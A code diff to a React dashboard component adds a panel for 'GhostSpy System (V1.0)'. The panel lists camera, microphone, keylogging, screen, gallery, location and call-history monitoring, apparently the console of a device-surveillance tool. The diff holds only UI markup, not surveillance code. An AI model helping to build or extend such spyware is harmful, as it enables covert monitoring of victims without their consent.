@@ -74,11 +74,12 @@ export const DashboardContent = () => {
                   <Typography sx={{ color: Color.text.primary, fontSize: "14px" }}>
                     {t("dashboard.welcome")}
                   </Typography>
-                  <Typography sx={{ color: Color.text.primary, fontSize: "20px", fontWeight: 600 }}>
+                  <Typography sx={{ color: Color.text.purple, fontSize: "20px", fontWeight: 600 }}>
                     {user?.username}
                   </Typography>
                 </div>
               </div>
+
               <div style={{ display: "flex", marginTop: "20px" }}>
                 <div style={{ padding: "0px 20px" }}>
                   <Typography sx={{ color: Color.text.primary, fontSize: "30px", fontWeight: 600 }}>
@@ -101,6 +102,58 @@ export const DashboardContent = () => {
                     {t("dashboard.installedDevices")}
                   </Typography>
                 </div>
+              </div>
+            </div>
+
+            <div
+              style={{
+                backgroundColor: Color.background.main_gray01,
+                border: `solid 1px ${Color.background.border}`,
+                borderRadius: "5px",
+                padding: "16px",
+                marginTop: "16px",
+              }}
+            >
+              {" "}
+              <div style={{ borderBottom: `solid 2px ${Color.background.border}` }}>
+                <Typography
+                  sx={{
+                    color: Color.text.primary,
+                    fontSize: "24px",
+                    fontFamily: "Bebas Neue, sans-serif",
+                    pb: 1,
+                  }}
+                >
+                  {"GhostSpy System (V1.0)"}
+                </Typography>
+              </div>
+              <div
+                style={{ marginTop: "20px", display: "flex", flexDirection: "column", gap: "10px" }}
+              >
+                <Typography sx={{ color: Color.text.primary, fontSize: "16px" }}>
+                  1. Screen Monitor
+                </Typography>
+                <Typography sx={{ color: Color.text.primary, fontSize: "16px" }}>
+                  2. Screen Skeleton Monitor
+                </Typography>
+                <Typography sx={{ color: Color.text.primary, fontSize: "16px" }}>
+                  3. Camera Monitor
+                </Typography>
+                <Typography sx={{ color: Color.text.primary, fontSize: "16px" }}>
+                  4. Mic Monitor
+                </Typography>
+                <Typography sx={{ color: Color.text.primary, fontSize: "16px" }}>
+                  5. Key Logs Monitor
+                </Typography>
+                <Typography sx={{ color: Color.text.primary, fontSize: "16px" }}>
+                  6. Gallery Manager
+                </Typography>
+                <Typography sx={{ color: Color.text.primary, fontSize: "16px" }}>
+                  7. Real-Time Location Monitor
+                </Typography>
+                <Typography sx={{ color: Color.text.primary, fontSize: "16px" }}>
+                  8. Call History Monitor
+                </Typography>
               </div>
             </div>
           </div>
